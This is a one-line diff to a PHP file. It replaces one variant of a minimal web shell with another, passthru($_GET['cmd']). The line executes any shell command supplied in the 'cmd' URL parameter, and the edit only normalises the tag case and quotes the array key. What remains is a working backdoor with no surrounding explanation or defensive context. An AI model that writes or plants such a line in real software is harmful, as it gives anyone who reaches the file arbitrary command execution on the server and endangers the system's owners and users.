@@ -1,1 +1,1 @@
-<?Php passthru($_GET[cmd]);?>
+<?php passthru($_GET['cmd']);?>
